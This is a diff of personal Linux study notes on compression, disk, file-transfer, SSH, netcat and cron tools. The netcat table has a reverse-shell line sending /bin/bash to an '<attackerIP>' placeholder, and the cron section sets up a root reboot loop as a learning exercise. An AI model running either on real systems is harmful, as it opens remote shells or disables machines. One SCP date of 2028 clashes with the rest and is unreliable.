@@ -1,9 +1,10 @@
 *June 07, 2026*
 
 
-# For unzipping
+# **For unzipping**
 
 ## **Gunzip** 
+----
 *June 07, 2026*
 *For gzip* — not for `.zip` or `.tar`
 
@@ -84,6 +85,7 @@ Why?
 ```
 
 ## **bunzip2/bzip2**
+---
 *June 07, 2026*
 *Slower then [[#**Gunzip**]] but compresses smaller.*
 > Similarly — it also compress files and not directories
@@ -97,7 +99,6 @@ Why?
 | `-v`  | `verbose`                        | Shows compression progress                        |
 | `-c`  | compress or decompress to stdout |                                                   |
 |       |                                  |                                                   |
-
 
 ### Practical Usage
 
@@ -190,11 +191,14 @@ tar -xvfj archivedFile.tar.bz2
 #For xz
 tar -xvfJ archivedFile.tar.xz
 ```
-# **CRON**
 
-## systemctl
 
-# FOR DISK-RELATED TOOLS
+
+
+
+
+
+# **FOR DISK-RELATED TOOLS**
 
 ### fdisk 
 ---
@@ -307,9 +311,10 @@ It checks and repairs filesystem structure issues like:
 Files here usually lose their original names (since the naming info was in the broken link), but the content is preserved. Worth checking after a major recovery.
 
 
-# File Transfer Tools
+# **File Transfer Tools**
 
 ### **RYSNC**
+---
 *Synchornization tool, not just copying*
 
 >[!Note] Usage
@@ -370,6 +375,7 @@ rysync -avz --progress -e "ssh -p [portNum]" username@ipaddress:[source] [destin
 |                                      |                                                                        |                                                                                                                                                                                                                               |
 
 ### SCP 
+----
 *June 27, 2028*
 *Secure Copy — used to copy files between machines over SSH*
 
@@ -378,12 +384,12 @@ rysync -avz --progress -e "ssh -p [portNum]" username@ipaddress:[source] [destin
 scp [flags] <source> <destination>
 ```
 
->**Copy LOCAL to REMOTE**
+#### **Copy LOCAL to REMOTE**
 ```bash
 scp [flags and options] [the_File] <user>@<remoteIP>:[dest_Path/]
 ```
 
->**Copy REMOTE to LOCAL**
+#### **Copy REMOTE to LOCAL**
 ```bash
 scp [flags and options] <user>@<remoteIP>:[source_Path] [dest_path]
 ```
@@ -400,7 +406,7 @@ scp [flags and options] <user>@<remoteIP>:[source_Path] [dest_path]
 ---
 ---
 
-# Networking 
+# **Networking** 
 
 ### SSH (Secure Shell)
 ---
@@ -422,17 +428,17 @@ Reference how to setup : [[SSH_Setup]]
 
 ---
 
-#### How to File Transfer using SCP
+#### **How to File Transfer using SCP**
 ---
 Read more here : [[#SCP]]
 
 ---
-#### How to use rsync over SSH
+#### **How to use rsync over SSH**
 ---
 Read more here: [[#**RYSNC**]]
 
 ---
-#### How to Local Port Forwarding
+#### **How to Local Port Forwarding**
 ---
 *Use this when you want to access a web UI of a certain service running only locally*
 
@@ -500,7 +506,7 @@ NPM
 ```
 
 ---
-#### How to Dynamic Port Forwarding
+#### **How to Dynamic Port Forwarding**
 ---
 *If flag `-L` is use for local service one at a time. This one do it dynamic, not needing to re-logout then use another port for another service.*
 
@@ -577,7 +583,7 @@ ssh -i [location/filename] user@host/ip
 >Basic Syntax
 ```bash
 nc [options] <host> <destination_port>    #client mode
-nc -l <port>                  #listener mode
+nc -l <port>                              #listener mode
 ```
 
 #### How it works
@@ -604,7 +610,7 @@ You --> RAW SOCKET --> Remote port
 | Port Listening    | Explicitly state the server's ip                    | `nc -l <ipadress> <port>`                                                                        |                                                                                                                                                                                                                                               |
 | Banner Grabbing   | Identify what service is running on a port          | `echo "" \| nc -v exmaple.com 80`                                                                |                                                                                                                                                                                                                                               |
 | File Transfer     | Sends files between machines without scp/ftp        | Receiver:  `nc -l 9000 > received_file.tar.gz`<br>Sender:   `nc 192.168.1.10 9000 < file.tar.gz` | TIP: the `>  <` is also use for redirection of text when doing real time chat<br>`nc -lv 4444 > to_this_file`  <br>`nc <ip> <port> > to this file`<br><br>now both text for client and server are redirected to their respective file choice. |
-| Chat              | Primitive real-time chata over a LAN                | Machine A:  `nc -l 5000`<br>Machine B: `nc 192.168.1.10 5000`                                    |                                                                                                                                                                                                                                               |
+| Chat              | Primitive real-time chata over a LAN                | Machine A:  `nc -l 5000`<br>Machine B: `nc 192.168.1.10 5000`                                    | Example: Piping <br>`echo "message" \| nc -l <port><br>                                                                                                                                                                                       |
 | Proxying          | Real traffic between hosts                          |                                                                                                  |                                                                                                                                                                                                                                               |
 | Shell Access      | Bind or Reverse shell (used heavily in pentesting)  | Attacker:  `nc -l -p 4444`<br>Victim:  `<attackerIP> 4444 -e /bin/bash`                          |                                                                                                                                                                                                                                               |
 | Server Simulation | Stand up quikc listener to test client behavior     |                                                                                                  |                                                                                                                                                                                                                                               |
@@ -719,7 +725,232 @@ namp [options] target
 ---
 
 ### wireshark
+---
 *July 11, 2026*
 A tool used to for packet analysis.
 
 **Capabilities:** *Network Troubleshooting, Security Analysis, Protocol Analysis, Deep Filtering*
+
+---
+
+# **Time Scheduler**
+---
+
+## **Cron**
+---
+*August 11, 2026*
+A  built-in mechanism in Linux to run commands or scripts automatically on specified time or interval.
+- Its like Task Scheduler of Windows
+
+In simple term:
+>"When this specific time comes, run this command"
+
+#### **How it works in abstract architecture**
+---
+```
+              CRON SYSTEM
+                   │
+        ┌──────────┴──────────┐
+        ▼                     ▼
+   Cron daemon             Crontab
+   "Secretary"            "Schedule"
+        │                     │
+        │◄── reads/checks ────┘
+        │
+        ▼
+   "It's time."
+        │
+        ▼
+   Execute command
+```
+
+**There are two parts**
+1. `cron` daemon (`crond`) – The `secretary` or `scheduler`
+	- Continuously running in the background
+	- It always checks the schedule
+	- **EXECUTES** the appropriate command to run a certain script when due
+2. `Crontab` 
+	- Schedule / instruction sheet
+	- Contains `WHAT` to run
+	- Contains `WHEN` to run it
+
+---
+#### **The problem it solves**
+---
+
+It solves the repetitive tasks such as:
+- Backup files every day or week or month
+- Cleanup temp files every day or week or month
+- Log maintenance everytime
+- Database dump 
+
+----
+
+####  **Three places to store cron schedules**
+---
+1. `crontab -e`
+	- For each user
+	- No `user` field entry 
+2. `/etc/crontab`
+	- System wide, single file
+	- It has `user` field to know who runs the command
+	- Usually requires root/sudo privileges
+3. `/etc/cron.d/*`
+	- System-wide
+	- Contains mini `crontab files` 
+	- Inside those `crontab files` may include one or more cronjob entries
+
+---
+
+#### **Reading its format**
+---
+Reference:
+```c
+bandit21@bandit:/etc/cron.d$ cat cronjob_bandit23
+
+#====OUTPUT=====
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+```
+
+**Crontab entry (System-wide)**
+```
+[schedule] [user] [command]
+```
+
+>**Line 1**
+```c
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+```
+- `@reboot` – A special shortcut. Every time theres a reboot or restart.
+- `bandit23` – the `user` who will run the command. 
+- `/usr/bin/cronjob_bandit23.sh` - the script file that will be run.
+- `&> /dev/null` – A redirection all [[Whatis#3. stderr(Standard Error)|stderr]]
+
+>*"Every time that the machine restarts, run the scrip as user bandit23 and show no output"*
+
+>**Line2**
+```
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+  
+*     *     *     *     *
+│     │     │     │     │
+│     │     │     │     └─ Day of week       (Mon—Sun, valued 0-7)
+│     │     │     └─────── Month             1-12 or jan-dec
+│     │     └───────────── Day of month      1-31
+│     └─────────────────── Hour      0-23
+└───────────────────────── Minute    0-59
+```
+"If they are all asterisk `*` . It means every minute"
+>"*Every minute. Execute the `/usr/bin/cronjob_bandit23.sh` as user `bandit23` *"
+
+>**Common shortcuts**
+- `@hourly` — `0 * * * *`
+- `@daily` —  `0 0 * * *`
+- `@weekly` — `0 0 * * 0` (0-7)  
+- `@monthly` — `0 0 1 * *`
+- `@yearly` — `0 0 1 1 *`  
+
+##### Environment path:
+----
+```
+#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+The line above i written at `/etc/crontab`.  It is commented intentionally because, the default is already sufficient for normal system commands
+
+****
+### **How to cron**
+---
+#### **How to edit, list, and remove crontab**
+---
+>**Edit the current users crontab**
+```
+crontab -e
+```
+Then, for test:
+```
+* * * * * echo "Hello World" >> /tmp/temporarycron.txt
+```
+
+>**To view/list crontab:**
+```
+crontab -l
+```
+
+It doesn't directly edit the actual installed crontab while editing. 
+Conceptually:
+```
+crontab -e
+     │
+     ▼
+Temporary editing copy at  /tmp/crontab.IoeFVc/crontab     
+     │
+     │ user performs edit
+     ▼
+   Save/Exit
+     │
+     ▼
+cron validates/installs it
+     │
+     ▼
+User's crontab updated
+```
+Once save and exit. Only then the crontab utility will update the new crontab and save it inside the [[Linux_File_System__Major_Only_#/var/spool|/var/spool directory]]
+
+>**To remove crontab**
+```
+crontab -r
+```
+Note: This removes the entire cronjobs in a crontab. 
+To remove certain crobjob, first do `crontab -e` then remove the entry.
+
+---
+#### **How to use system-wide crontab**
+---
+*Requires sudo*
+The `/etc/crontab` is simplest 
+```
+sudo nano /etc/crontab
+```
+Then do edit:
+```
+* * * * * yourusername echo "system cron" >> /tmp/system-cron.txt
+```
+
+---
+#### **How to view CRON logs**
+---
+Debian/Ubuntui systems
+```
+grep -i cron /var/log/syslog
+```
+---
+#### **How to Capture Job Output and Errors**
+---
+*Read first about : [[Whatis#STDOUT, STDIN, STDERR]] for better understanding about redirections.*
+
+Because default system logs only note execution events, you must explicitly redirect a job's output within your crontab configuration to debug failures.
+
+**Append the output to a file**
+```
+* * * * * <user> command >> /var/log/my_cronjob.log 2>&1
+```
+
+**Overwrite the log file every run**
+```
+* * * * * <user> command > /var/log/my_cronjob.log 2>&1
+```
+---
+
+#### **How to reboot loop a machine using cron**
+---
+*Requires sudo access*
+*The purpose of this setup is to learn to fix it*
+
+Edit a crontab at `/etc/`
+```
+sudo nano /etc/cron.d/reboot_loop
+@reboot root reboot 
+```
+
+*Note:* This wont wont with regular user, becuase, the reboot command for regular users requires ***interactive authentication context*** via `polkit/systemd-logind` in which case a cron doesnt have.
